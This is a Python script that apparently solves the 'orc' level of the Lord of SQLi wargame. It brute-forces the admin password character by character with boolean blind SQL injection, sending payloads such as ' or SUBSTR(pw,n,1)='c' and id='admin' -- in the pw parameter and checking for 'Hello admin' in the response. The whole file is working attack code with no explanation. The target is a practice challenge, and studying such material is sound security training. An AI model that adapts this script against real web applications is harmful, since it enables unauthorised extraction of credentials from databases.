#!/usr/bin/python3
# coding : UTF-8

import sys
import requests
import time

def main():
    url = "https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php"
    ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'
    headers = {'User-Agent': ua}
    cookies = dict(PHPSESSID='XXXXXXXXXXXXXXXXXXXXX')

    chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    password = ""
    for count in range(1, 10):
        for char in chars:
            print("  " + char)
            val = '\' or SUBSTR(pw,{count},1)=\'{char}\' and id = \'admin\' -- ;'.format(count = count, char = char)
            params = {'pw': val}
            response = requests.get(url, headers=headers, params=params, cookies=cookies, allow_redirects=False)
            if response.text.count("Hello admin") == 1:
                password += char
                print(password)
                break
            if char == 'Z':
                print("not found")
                return
    print(password)

if __name__ == "__main__":
    main()
